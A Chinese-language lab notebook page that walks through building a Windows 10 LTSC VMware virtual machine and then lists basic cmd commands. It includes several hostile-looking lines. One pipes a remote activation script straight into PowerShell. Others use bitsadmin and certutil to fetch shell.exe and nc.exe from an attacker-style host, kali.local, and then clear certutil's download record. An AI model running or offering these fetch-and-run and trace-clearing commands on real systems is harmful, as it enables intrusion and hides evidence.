图形化用户界面操作系统。

## 1. 准备

zh-cn_windows_10_enterprise_ltsc_2021_x64_dvd_033b7312.iso

```
https://www.microsoft.com/zh-cn/evalcenter/download-windows-10-enterprise
```

VMware

```
https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
```

目录

```
C:\Users\sec\Documents\Virtual Machines\windows
```

## 2. 配置

移动镜像文件到 `iso` 文件夹

```
C:\Users\sec\Documents\Virtual Machines\iso
```

VMware Workstation Pro

```
创建新的虚拟机
```

您希望使用什么类型的配置？

```
自定义
```

硬件兼容性

```
Workstation 17.5 or later
```

安装来源

```
稍后安装操作系统
```

客户机操作系统

```
Microsoft Windows
```

版本

```
Windows 10 x64
```

虚拟机名称

```
windows
```

位置

```
C:\Users\sec\Documents\Virtual Machines\windows
```

固件类型

```
UEFI
```

处理器数量

```
1
```

每个处理器的内核数量

```
2
```

此虚拟机的内存

```
4096 MB
```

网络连接

```
使用桥接网络
```

SCSI 控制器

```
LSI Logic SAS
```

虚拟磁盘类型

```
NVMe
```

磁盘

```
创建新虚拟磁盘
```

最大磁盘大小

```
64.0 GB
```

```
将虚拟磁盘存储为单个文件
```

磁盘文件

```
C:\Users\sec\Documents\Virtual Machines\windows\windows.vmdk
```

编辑虚拟机设置

处理器

```
虚拟化引擎
虚拟化 Intel VT-x/EPT 或 AMD-V/RVI
```

CD/DVD

```
使用 ISO 映像文件
C:\Users\sec\Documents\Virtual Machines\iso\zh-cn_windows_10_enterprise_ltsc_2021_x64_dvd_033b7312.iso
```

显示

```
3D 图形
关闭加速 3D 图形
```

文件夹共享

```
总是启用
```

```
在 Windows 客户机中映射为网络驱动器
```

添加共享文件夹

```
主机路径
C:\Users\sec\share\VMware
名称
VMware
```

其他属性

```
启用此共享
只读
```

拍摄快照并命名为 `配置` 

## 3. 安装

输入语言和其他首选项

```
要安装的语言: 中文(简体, 中国)
时间和货币格式: 中文(简体, 中国)
键盘和输入方法: 微软拼音
```

现在安装

适用的声明和许可条款

```
我接受许可条款
```

你想执行哪种类型的安装

```
自定义: 仅安装 Windows
```

您想将 Windows 安装在哪里?

```
驱动器 0 未分配的空间
```

让我们先从区域设置开始。这样对吧?

```
中国
```

这种键盘布局是否合适?

```
微软拼音
```

是否要添加第二种键盘布局?

```
添加布局
```

你的第二个键盘布局想使用哪种语言?

```
英语(美国)
```

你要使用哪个键盘布局?

```
美式键盘
```

通过 Microsoft 登录

```
改为域加入
```

谁将会使用这台电脑?

```
sec
```

创建容易记住的密码

```
123456
```

确认你的密码

```
123456
```

为此帐户创建安全问题

```
你第一个宠物的名字是什么?
123456
你出生城市的名称是什么?
123456
你的母校名称是什么?
123456
```

为你的设备选择隐私设置

```
位置: 否
诊断数据: 否
量身定制的体验: 否
查找我的设备: 否
墨迹书写和键入: 否
广告 ID: 否
```

关机，快照命名为 `安装` 

## 4. 初始化

[配置电源选项](https://keithpeck177271.gitbook.io/notes/misc/wen-ti-ji-jin/issues-of-windows#id-2-tui-jian-dian-yuan-she-zhi)

以管理员权限运行 PowerShell

禁用快速启动和休眠功能

```powershell
PS C:\Windows\system32> powercfg -h off
```

使用 [Microsoft Activation Scripts (MAS)](https://massgrave.dev/) 激活

```powershell
PS C:\Windows\system32> irm https://get.activated.win | iex
```

网络配置文件

```
专用
```

网络设置

```
IPv4: 开
IP 地址: <host-ip>
子网掩码: 255.255.255.0
默认网关: 192.168.1.1
首选 DNS 服务器: 8.8.8.8
备用 DNS 服务器: 8.8.4.4
```

在 `hosts` 文件添加域名映射

```shell
C:\Windows\System32\drivers\etc\hosts
```

运行 `gpedit.msc` , 启用不显示锁屏

```
计算机配置 > 管理模板 > 控制面板 > 个性化 > 不显示锁屏 > 已启用
```

更新并设置 驱动, Windows, Edge

使用 Dism++ 修改系统设置

设置背景色为: `#282A36` 

设置主题色为: `#44475A` 

使用 [Office Tool Plus](https://keithpeck177271.gitbook.io/notes/misc/shi-yan-huan-jing/ban-gong-ruan-jian/wen-ben-wen-dang/wen-dang-bian-ji/microsoft-365/office-tool-plus) 安装 Word, Excel, PowerPoint, Visio.

关机，快照命名为 `初始化` 

配置 SMB 文件共享

## 5. 部署

|                            虚拟机                            |
| :----------------------------------------------------------: |
|               [7-Zip](https://www.7-zip.org/)                |
|             [Geek](https://geekuninstaller.com/)             |
| [OpenSSH](https://learn.microsoft.com/zh-cn/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell) |
|           [phpStudy](https://www.xp.cn/php-study)            |
|          [phpStudyPro](https://www.xp.cn/php-study)          |

|                            笔记本                            |
| :----------------------------------------------------------: |
| [Lenovo System Update](https://www.lenovo.com/us/en/software/lenovo-system-update) |

|                            台式机                            |
| :----------------------------------------------------------: |
| [AMD Software꞉ Adrenalin Edition](https://www.amd.com/zh-cn/support/download/drivers.html) |
| [Twinkle Tray](https://github.com/xanderfrangos/twinkle-tray) |

|                            物理机                            |
| :----------------------------------------------------------: |
|                [AnyTXT](https://anytxt.net/)                 |
| [Burp Suite Professional](https://portswigger.net/burp/pro)  |
| [ContextMenuManager](https://github.com/BluePointLilac/ContextMenuManager) |
| [Dism++](https://github.com/Chuyu-Team/Dism-Multi-language)  |
|        [Everything](https://www.voidtools.com/zh-cn/)        |
|    [Firefox](https://www.mozilla.org/en-US/firefox/new/)     |
|          [FreeFileSync](https://freefilesync.org/)           |
|             [Geek](https://geekuninstaller.com/)             |
|           [GlassWire](https://www.glasswire.com/)            |
|       [Google Chrome](https://www.google.com/chrome/)        |
|            [ImageGlass](https://imageglass.org/)             |
|     [Java](https://www.java.com/en/download/manual.jsp)      |
|             [KeePassXC](https://keepassxc.org/)              |
|        [Koodo Reader](https://www.koodoreader.com/en)        |
|             [LocalSend](https://localsend.org/)              |
|            [LockHunter](https://lockhunter.com/)             |
|         [Notepad++](https://notepad-plus-plus.org/)          |
|           [Pinta](https://www.pinta-project.com/)            |
|               [PixPin](https://pixpinapp.com/)               |
|              [Potplayer](https://potplayer.tv/)              |
|                  [Scoop](https://scoop.sh/)                  |
|         [Stretchly](https://hovancik.net/stretchly/)         |
|             [Syncthing](https://syncthing.net/)              |
|              [Telegram](https://telegram.org/)               |
|            [TTime](https://ttime.timerecord.cn/)             |
|     [TurboTop](https://www.savardsoftware.com/turbotop/)     |
|                 [Typora](https://typora.io/)                 |
|          [v2rayN](https://github.com/2dust/v2rayN)           |
|      [VeraCrypt](https://www.veracrypt.fr/en/Home.html)      |
|     [Visual Studio Code](https://code.visualstudio.com/)     |
| [VMware](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion) |
| [Windows Terminal](https://apps.microsoft.com/detail/9n0dx20hk701?hl=en-us&gl=US) |
|                [微信](https://weixin.qq.com/)                |
|                 [Xmind](https://xmind.app/)                  |
|                [Yakit](https://yaklang.com/)                 |

## 6. 使用

### 6.1 查看帮助

```cmd
C:\Users\Administrator> [command] /?
```

### 6.2 历史命令

查看历史命令

```cmd
C:\Users\Administrator> doskey /history
```

### 6.3 远程下载

**bitsadmin**

使用 bitsadmin 下载文件

```cmd
C:\Users\Administrator> bitsadmin /transfer n http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
```

```cmd
C:\Users\Administrator> bitsadmin /rawreturn /transfer getfile http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
```

**certutil**

使用 certutil 下载文件

```cmd
C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe C:\Users\Administrator\nc.exe
```

删除 certutil 下载记录

```cmd
C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe delete
```

### 6.4 程序

运行程序

```cmd
C:\Users\Administrator> start shell.exe
```

### 6.5 修改编码

查看当前编码

```cmd
C:\Users\Administrator> chcp
```

修改编码为 UTF-8

```cmd
C:\Users\Administrator> chcp 65001
```

编码列表

```
65001	UTF-8		Unicode
936		GB2312		简体中文
936		GBK			简体中文，包括更多的字符
950		Big5		繁体中文
437		MS-DOS		美式英语
932		Shift-JIS	日语
949		EUC-KR		韩语
```

### 6.6 用户管理

查看用户名

```cmd
C:\Users\Administrator> whoami
```

```cmd
whoami
a-win10-1903\administrator
```

添加用户

```cmd
C:\Users\Administrator> net user admin admin /add
```

```cmd
net user admin admin /add
The command completed successfully.
```

查看所有用户

```cmd
C:\Users\Administrator> net user
```

```cmd
net user

User accounts for \\A-WIN10-1903

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount           
Guest                    sec                      WDAGUtilityAccount       
The command completed successfully.
```

查看用户信息

```cmd
C:\Users\Administrator> net user admin
```

```cmd
net user admin
User name                    admin
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?2024/?1/?2 15:47:13
Password expires             ?2024/?2/?13 15:47:13
Password changeable          ?2024/?1/?2 15:47:13
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

删除用户

```cmd
C:\Users\Administrator> net user admin /del
```

```cmd
net user admin /del
The command completed successfully.
```

### 6.7 文件权限

![文件权限](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90.png)

### 6.8 查看进程

```cmd
C:\Users\Administrator> netstat -ano
```

### 6.9 查看系统架构

```cmd
C:\Users\Administrator> wmic os get osarchitecture
```

### 6.10 添加环境变量

添加环境变量

![添加环境变量](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png)

> 添加多个变量时使用 `;` 间隔
>
> ```
> Path
> %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;D:\software\Microsoft VS Code\bin;D:\software\SDelete
> ```

### 6.11 临时文件夹

```powershell
PS C:\Users\sec> dir C:\Windows\Temp
```

### 6.12 添加快捷访问

![添加快捷访问](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E5%BF%AB%E6%8D%B7%E8%AE%BF%E9%97%AE.png)

### 6.13 查看网络

```cmd
C:\Users\Administrator> route print
```

### 6.14 权限

```
SYSTEM : 系统权限，可对系统文件进行修改
Administrator : 管理员权限，可对所有普通用户文件进行修改
User : 普通用户权限
Administrator : 可以通过 psexec 获取 SYSTEM 权限
Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM 不需要
```

### 6.15 修复

扫描系统文件的完整性，并修复受损的文件

```cmd
C:\Users\Administrator> sfc /scannow
```

### 6.16 禁用 WSL

列出当前系统上安装的 WSL 发行版

```powershell
PS C:\Users\sec> wslconfig /l
```

删除 WSL 发行版

```powershell
PS C:\Users\sec> wsl --unregister <distribution name>
```

禁用 WSL 功能

```powershell
PS C:\Users\sec> Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

检查 WSL 状态

```powershell
PS C:\Users\sec> wslconfig /l
```

关闭虚拟机平台

![关闭虚拟机平台](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E5%85%B3%E9%97%AD%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0.png)

### 6.17 删除

要删除一个文件，你可以运行：

```powershell
Remove-Item "C:\path\to\file.txt"
```

要删除一个目录及其内容，你可以运行：

```powershell
Remove-Item "C:\path\to\directory" -Recurse
```

### 6.18 证书安装

双击证书文件安装

![双击证书文件安装](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E5%8F%8C%E5%87%BB%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E5%AE%89%E8%A3%85.png)

选择安装到当前用户

![选择安装到当前用户](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E9%80%89%E6%8B%A9%E5%AE%89%E8%A3%85%E5%88%B0%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7.png)

选择存储到受信任的根证书颁发机构

![选择存储到受信任的根证书颁发机构](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E9%80%89%E6%8B%A9%E5%AD%98%E5%82%A8%E5%88%B0%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%A0%B9%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84.png)

---

参考链接

- [Windows](https://learn.microsoft.com/zh-cn/windows/)

